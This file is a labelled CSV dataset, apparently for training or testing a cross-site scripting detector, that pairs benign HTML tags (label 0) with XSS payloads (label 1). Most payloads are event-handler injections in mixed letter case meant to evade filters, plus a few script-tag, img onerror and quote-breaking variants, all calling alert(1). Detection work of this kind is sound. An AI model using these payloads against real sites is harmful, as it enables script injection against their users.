payload,label
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a onmOusEoVEr=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg onMOuSeOveR=alert(1)>,1
<a oNcLIcK=alert(1)>,1
<a OnClIcK=alert(1)>,1
<div oNMouSeoVer=alert(1)>,1
<svg attr=value>,0
<img onFoCUs=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<test OnClicK=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<svg OnCLiCK=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test onmOUsEover=alert(1)>,1
<div attr=value>,0
<div onCLicK=alert(1)>,1
<svg attr=value>,0
<svg oncliCK=alert(1)>,1
<img ONloAD=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<TEST X=y>,0
<img attr=value>,0
<img attr=value>,0
<div OnfocUs=alert(1)>,1
<a oNmOuSEOVEr=alert(1)>,1
<svg attr=value>,0
<div OnMOuseOvEr=alert(1)>,1
<svg attr=value>,0
<img oncLICk=alert(1)>,1
<svg attr=value>,0
<test oNcliCK=alert(1)>,1
<test oNclICk=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div OnLOaD=alert(1)>,1
<test onFoCuS=alert(1)>,1
<a attr=value>,0
<div ONmoUsEoVER=alert(1)>,1
<img oNfoCus=alert(1)>,1
<a OnMousEOvER=alert(1)>,1
<a oNLOAD=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<test oNfoCuS=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<div oNMoUseovEr=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div onfOcUS=alert(1)>,1
<div attr=value>,0
<div oNMOUsEoVER=alert(1)>,1
<test oncLIcK=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div oncLICK=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<svg OnCLiCk=alert(1)>,1
<img attr=value>,0
<div ONFOcUs=alert(1)>,1
<div attr=value>,0
<img onclICK=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<img oNCliCk=alert(1)>,1
<a attr=value>,0
<test OnCLIck=alert(1)>,1
<a OnCLICk=alert(1)>,1
<test attr=value>,0
<test oNFOCus=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg onMoUseovER=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div onLoad=alert(1)>,1
<div attr=value>,0
<a oNfOcUS=alert(1)>,1
<svg attr=value>,0
<img OnmOuSEover=alert(1)>,1
<test oNLoad=alert(1)>,1
<a oNloAd=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<img OnFOCUS=alert(1)>,1
<svg ONlOAD=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<svg OnfOcUs=alert(1)>,1
<test ONloaD=alert(1)>,1
<svg ONLoAd=alert(1)>,1
<div oNfocuS=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<div OnmOuSeOvER=alert(1)>,1
<a attr=value>,0
<img oNfOcUs=alert(1)>,1
<div attr=value>,0
<svg OnfOcuS=alert(1)>,1
<svg attr=value>,0
<test onLoAD=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div OnmoUSEOver=alert(1)>,1
<svg oNloAD=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<test oNlOaD=alert(1)>,1
<test attr=value>,0
<test onMoUseoVer=alert(1)>,1
<test attr=value>,0
<img ONFOcuS=alert(1)>,1
<svg ONLoAD=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg OnmoUSeoveR=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg onLOAd=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg onMOusEOVER=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg onFOCuS=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img oNLOad=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<a oNMoUseOveR=alert(1)>,1
<a onmoUsEOVER=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<img onclicK=alert(1)>,1
<svg OnloAd=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<test onLoaD=alert(1)>,1
<img OnMOuSEOVeR=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<sCRipt>AlErt(1)</scripT>,1
<a ONclICK=alert(1)>,1
<a attr=value>,0
<svg OnLOAD=alert(1)>,1
<a attr=value>,0
<a oNmoUSeoVeR=alert(1)>,1
<svg attr=value>,0
<svg OnlOAd=alert(1)>,1
<a ONmOUSEOVeR=alert(1)>,1
<a ONmOUSEOVeR=alert(1)>,1
<a oncLICk=alert(1)>,1
<svg OnLoAD=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img OnFOCuS=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img onfOcuS=alert(1)>,1
<a ONMOuSEOVeR=alert(1)>,1
<a onFocus=alert(1)>,1
<test attr=value>,0
<test oNMoUseOveR=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<div attr=value>,0
<img attr=value>,0
<svg oncLick=alert(1)>,1
<div oNMouSEoVEr=alert(1)>,1
<a onclick=alert(1)>,1
<a OnClICK=alert(1)>,1
<a attr=value>,0
<a ONmousEOvEr=alert(1)>,1
<svg attr=value>,0
<a oNcLIcK=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<svg onMOUseovEr=alert(1)>,1
<div attr=value>,0
<svg oNCLick=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div OnMOUSeoVEr=alert(1)>,1
<test oNloaD=alert(1)>,1
<img onLOaD=alert(1)>,1
<a OnFOCUS=alert(1)>,1
<div oNCLICk=alert(1)>,1
<img OnCLICK=alert(1)>,1
<img ONloAd=alert(1)>,1
<img attr=value>,0
<a oNMouseovEr=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<img ONfOcuS=alert(1)>,1
<a OnLoAD=alert(1)>,1
<a oNmOuSEOVeR=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div OnlOAD=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img OnfOCus=alert(1)>,1
<a attr=value>,0
<div onLoAd=alert(1)>,1
<a OnfocUS=alert(1)>,1
<svg oNload=alert(1)>,1
<a attr=value>,0
<svg OnclICk=alert(1)>,1
<test oNfocUS=alert(1)>,1
<a attr=value>,0
<svg OncLICK=alert(1)>,1
<svg oNloAD=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img ONFoCuS=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<div ONCLiCK=alert(1)>,1
<a OnmOUseOVer=alert(1)>,1
<img onfocuS=alert(1)>,1
<img attr=value>,0
<img OnCLick=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<test ONclICk=alert(1)>,1
<test attr=value>,0
<img OnMoUSEoVER=alert(1)>,1
<a oNclick=alert(1)>,1
<img oNLoaD=alert(1)>,1
<test attr=value>,0
<div OnCLiCk=alert(1)>,1
<div attr=value>,0
<test onLoAd=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<test attr=value>,0
<spAN DaTA-SRC='iMG'>,0
<test oNfoCUS=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<img onmouSeoVeR=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg OnLOAD=alert(1)>,1
<svg ONClICK=alert(1)>,1
<img OncliCK=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a OnFocUs=alert(1)>,1
<test onMOuseOver=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<a attr=value>,0
<a onLOad=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<test attr=value>,0
<div ONLOad=alert(1)>,1
<svg attr=value>,0
<img ONFoCuS=alert(1)>,1
<test attr=value>,0
<div OncLICk=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg OncLiCk=alert(1)>,1
<div ONMOUsEOvEr=alert(1)>,1
<div attr=value>,0
<img onmouSeoVeR=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a oNFoCus=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg ONMOUSeOVER=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<div OnfocuS=alert(1)>,1
<test OnclICK=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img onLoAD=alert(1)>,1
<svg attr=value>,0
<svg ONLOad=alert(1)>,1
<test onloaD=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img onloAD=alert(1)>,1
<div attr=value>,0
<div ONcLick=alert(1)>,1
<test OnFocUS=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img ONfocUS=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<img ONCLIcK=alert(1)>,1
<svg attr=value>,0
<test oNmousEOvEr=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<test ONFOcus=alert(1)>,1
<div ONfoCuS=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test oNMouSeOVeR=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div attr=value>,0
<svg OncliCK=alert(1)>,1
<svg onmouSEOveR=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg OnfOCuS=alert(1)>,1
<test oncLICk=alert(1)>,1
<div oncLicK=alert(1)>,1
<a OnmOUsEoVeR=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a oNmOUseoVer=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div ONloAD=alert(1)>,1
<a attr=value>,0
<svg ONFOCuS=alert(1)>,1
<img OncLIcK=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test oNcLicK=alert(1)>,1
<test attr=value>,0
<img OnfoCUS=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<test ONmoUSeoVer=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a onfOcUs=alert(1)>,1
<test onfOCUs=alert(1)>,1
<div attr=value>,0
<div oNmOUSEOvEr=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<div oNlOaD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<a ONLOad=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div ONfoCuS=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<test onFoCus=alert(1)>,1
<svg onclick=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img attr=value>,0
<svg ONLoad=alert(1)>,1
<test attr=value>,0
<svg attr=value>,0
<div oNlOaD=alert(1)>,1
<img attr=value>,0
<test oNmOUseover=alert(1)>,1
<div attr=value>,0
<img onClicK=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<div attr=value>,0
<test ONLOAd=alert(1)>,1
<svg OnCLiCk=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<svg OncLiCK=alert(1)>,1
<a onclick=alert(1)>,1
<a attr=value>,0
<div OnLOaD=alert(1)>,1
<img oNmoUseovEr=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg onMOuSEOVeR=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg onlOad=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<img onMouSEoVER=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a ONLOaD=alert(1)>,1
<div oNCLICk=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<div oNClIck=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<div ONcLICK=alert(1)>,1
<a attr=value>,0
<svg onCLiCK=alert(1)>,1
<test oNFocus=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg oNCLICK=alert(1)>,1
<test onfoCus=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<img oNCLick=alert(1)>,1
<test attr=value>,0
<img ONloAD=alert(1)>,1
<a attr=value>,0
<img oNmOuSEoVer=alert(1)>,1
<svg oNFocus=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a ONmOUSEOVEr=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a ONfocus=alert(1)>,1
<a attr=value>,0
<test onLOAd=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a oNFoCUS=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div ONmOUSEOvEr=alert(1)>,1
<test OnCLiCk=alert(1)>,1
<svg Onfocus=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<a oNFoCus=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img attr=value>,0
<a attr=value>,0
<a OnlOAD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<<select name=artist>>,0
<test onloAd=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div OnlOAD=alert(1)>,1
<div OnmOuseoVER=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<div ONFOcUs=alert(1)>,1
<img attr=value>,0
<test onLOaD=alert(1)>,1
<img attr=value>,0
<svg oNMOuSEoVer=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a oNMouseOVeR=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test onmoUseoVER=alert(1)>,1
<a OnFOcUs=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div onmouseoVEr=alert(1)>,1
<a Onload=alert(1)>,1
<a attr=value>,0
<svg ONfoCUS=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div oNCLIck=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<img ONmOuseovER=alert(1)>,1
<test attr=value>,0
<svg onfOCUS=alert(1)>,1
<svg attr=value>,0
<a onloaD=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a ONloAd=alert(1)>,1
<test attr=value>,0
<svg oNmOUSeovER=alert(1)>,1
<test OnclIck=alert(1)>,1
<img ONFOCus=alert(1)>,1
<div oNfoCUS=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img oNfOCus=alert(1)>,1
<a ONClICk=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<div OnloAD=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<a onMOUsEOvER=alert(1)>,1
<div attr=value>,0
<test onMousEoVer=alert(1)>,1
<a OnCLiCk=alert(1)>,1
<test ONlOAd=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<test OnclIck=alert(1)>,1
<test onLOAD=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img OncliCk=alert(1)>,1
<a oNfocUs=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<img OnmoUseOvER=alert(1)>,1
<img ONLOaD=alert(1)>,1
<img ONcLiCK=alert(1)>,1
<a onFoCUs=alert(1)>,1
<img src=x onerror=alert(1)>,1
<svg OnLoad=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<a oNLoAd=alert(1)>,1
<svg Onload=alert(1)>,1
<img attr=value>,0
<div oNMOUsEovER=alert(1)>,1
<img oNFOcUs=alert(1)>,1
<svg oNmOUSeOVeR=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img ONfOCUS=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img attr=value>,0
<img attr=value>,0
<svg oNClICK=alert(1)>,1
<div attr=value>,0
<img onCLiCK=alert(1)>,1
<a attr=value>,0
<img ONMOUSeOVer=alert(1)>,1
<a oNMoUSEoVER=alert(1)>,1
<img ONFOcuS=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<div ONLOaD=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<test oNMoUSEOVer=alert(1)>,1
<img ONfocus=alert(1)>,1
<a ONfocuS=alert(1)>,1
<div attr=value>,0
<img OnLoAd=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<a oNLOAD=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img ONmOUSeovER=alert(1)>,1
<a attr=value>,0
<div OnClICK=alert(1)>,1
<svg attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img ONcliCK=alert(1)>,1
<a attr=value>,0
<div oNMouseOvEr=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<img ONmOuSEOver=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<svg ONclICK=alert(1)>,1
<svg onfocUs=alert(1)>,1
<img oNloaD=alert(1)>,1
<a OnmoUsEoveR=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg OnFoCuS=alert(1)>,1
<a attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a OnlOaD=alert(1)>,1
<svg onfOCuS=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<img attr=value>,0
<svg OnlOad=alert(1)>,1
<div attr=value>,0
<svg OnmouseovEr=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div oNLOAD=alert(1)>,1
<svg ONfoCUS=alert(1)>,1
<svg attr=value>,0
<a onFOCuS=alert(1)>,1
<a attr=value>,0
<div ONmoUseOver=alert(1)>,1
<svg oNCLiCK=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<div OnlOad=alert(1)>,1
<div attr=value>,0
<div onmouseovER=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg attr=value>,0
"""'>><<script>>alert(1)<</script>>",1
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div ONLoad=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a ONFOCuS=alert(1)>,1
<svg attr=value>,0
<div OncLick=alert(1)>,1
<div ONfoCus=alert(1)>,1
<img OnFOcUs=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<div onFocUS=alert(1)>,1
<a onLOad=alert(1)>,1
<test attr=value>,0
<a onMOuseOVer=alert(1)>,1
<img OnmOUSEoVer=alert(1)>,1
<div onFoCus=alert(1)>,1
<img ONcliCk=alert(1)>,1
<test attr=value>,0
<svg onClICk=alert(1)>,1
<svg attr=value>,0
<a onClIck=alert(1)>,1
<a OnlOAd=alert(1)>,1
<svg onMoUsEoveR=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a onMOUSEoVER=alert(1)>,1
<img oNCLick=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<svg oNlOaD=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<test oNloaD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<a OnloAD=alert(1)>,1
<a Onclick=alert(1)>,1
<img attr=value>,0
<a ONCLick=alert(1)>,1
<test attr=value>,0
<a onFoCUS=alert(1)>,1
<div ONfocus=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<svg onClicK=alert(1)>,1
<div attr=value>,0
<svg OnLOaD=alert(1)>,1
<div OncLick=alert(1)>,1
<a attr=value>,0
<a OnmOuSeoVer=alert(1)>,1
<div ONMOUsEOVer=alert(1)>,1
<test onLoAD=alert(1)>,1
<svg attr=value>,0
<a attr=value>,0
<div attr=value>,0
<a attr=value>,0
<a onlOad=alert(1)>,1
<test attr=value>,0
<img oNcLiCK=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<div attr=value>,0
<svg attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test OnclICK=alert(1)>,1
<a attr=value>,0
<test OnMOUSEovER=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<svg oNFoCuS=alert(1)>,1
<div attr=value>,0
<img OnfOcUs=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<test attr=value>,0
<svg oNFoCUS=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<img ONLoaD=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a oNFoCus=alert(1)>,1
<div oNcLick=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<a ONfOcuS=alert(1)>,1
<test attr=value>,0
<img attr=value>,0
<test oNloaD=alert(1)>,1
<a attr=value>,0
<test OnMoUSEover=alert(1)>,1
<test OnCLICK=alert(1)>,1
<div OnfOCUs=alert(1)>,1
<svg onloaD=alert(1)>,1
<img attr=value>,0
<a attr=value>,0
<img OnCliCK=alert(1)>,1
<svg attr=value>,0
<div oNMOUSeovEr=alert(1)>,1
<img oNFOCUS=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<a ONlOad=alert(1)>,1
<test onLoAD=alert(1)>,1
<img attr=value>,0
<img attr=value>,0
<test attr=value>,0
<img ONfOcUs=alert(1)>,1
<a attr=value>,0
<test OnLoaD=alert(1)>,1
<img attr=value>,0
<test onfocUS=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<div ONmoUSeOver=alert(1)>,1
<test oNMOuseOVer=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test attr=value>,0
<img ONmoUSeOVeR=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<div attr=value>,0
<img oNLOaD=alert(1)>,1
<a OnlOad=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<img attr=value>,0
<div attr=value>,0
<test ONmouseOVEr=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<a OnmouseoVEr=alert(1)>,1
<img attr=value>,0
<svg attr=value>,0
<a attr=value>,0
<a attr=value>,0
<img ONLoAd=alert(1)>,1
<a attr=value>,0
<a attr=value>,0
<a onLOad=alert(1)>,1
<img attr=value>,0
<a ONFocUs=alert(1)>,1
<div OnmOuSEovEr=alert(1)>,1
<a ONMOUSeover=alert(1)>,1
<div attr=value>,0
<svg attr=value>,0
<img attr=value>,0
<svg ONMoUsEoveR=alert(1)>,1
<a attr=value>,0
<div oNMOuSeOvER=alert(1)>,1
<div oNfOcus=alert(1)>,1
<a onFocUs=alert(1)>,1
<svg attr=value>,0
<div attr=value>,0
<div oNfoCuS=alert(1)>,1
<img oNFOCus=alert(1)>,1
<img attr=value>,0
<div attr=value>,0
<test attr=value>,0
<img attr=value>,0
<img ONmOusEovEr=alert(1)>,1
<test oNCLicK=alert(1)>,1
<svg ONMOUSeOVEr=alert(1)>,1
<test attr=value>,0
<a attr=value>,0
<a attr=value>,0
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<img oNfOcus=alert(1)>,1
<a attr=value>,0
<test attr=value>,0
<a onmOUseOvEr=alert(1)>,1
<a OnFoCus=alert(1)>,1
<svg attr=value>,0
<img ONfocUS=alert(1)>,1
<div attr=value>,0
<svg oNcLICk=alert(1)>,1
<div oNFocUs=alert(1)>,1
<div attr=value>,0
<img attr=value>,0
<div attr=value>,0
<a attr=value>,0
<test attr=value>,0
<svg oNLOAD=alert(1)>,1
<svg onLoad=alert(1)>,1
<a onfocUs=alert(1)>,1
<div attr=value>,0
<div attr=value>,0
<div attr=value>,0
<test attr=value>,0
<svg attr=value>,0
<img onclICK=alert(1)>,1
<img attr=value>,0
<test OnLoAd=alert(1)>,1
<div attr=value>,0
<div OnfOcuS=alert(1)>,1
<test attr=value>,0
<a oncLIck=alert(1)>,1
<div attr=value>,0
<a attr=value>,0
<test ONcLIcK=alert(1)>,1
<svg attr=value>,0
<a OnclICK=alert(1)>,1
<img Onload=alert(1)>,1
<test attr=value>,0
<img OnMOuSeoVeR=alert(1)>,1
<svg attr=value>,0
<test ONLoaD=alert(1)>,1
<a onmOUSEOVER=alert(1)>,1
<svg attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<img ONlOad=alert(1)>,1
<img attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div OnMoUSeOvER=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<a attr=value>,0
<test onload=alert(1)>,1
<img onloAD=alert(1)>,1
<test attr=value>,0
<a oNload=alert(1)>,1
<svg attr=value>,0
<img attr=value>,0
<svg attr=value>,0
<test attr=value>,0
<img attr=value>,0
<a attr=value>,0
<svg oNLOad=alert(1)>,1
<a attr=value>,0
<div attr=value>,0
<test ONfOcUS=alert(1)>,1
<test attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a attr=value>,0
<div attr=value>,0
<div attr=value>,0
<img ONMoUSeOVeR=alert(1)>,1
<test attr=value>,0
<div attr=value>,0
<img oNfOcUs=alert(1)>,1
<div attr=value>,0
<test attr=value>,0
<test attr=value>,0
<a oNMoUSEOver=alert(1)>,1
<a ONLoAd=alert(1)>,1
<test oNmoUSeovER=alert(1)>,1
<svg OnFoCUS=alert(1)>,1
<svg OnMOuSEOVEr=alert(1)>,1
<a attr=value>,0
<svg attr=value>,0
<a oncLiCK=alert(1)>,1
<test onmOusEovEr=alert(1)>,1
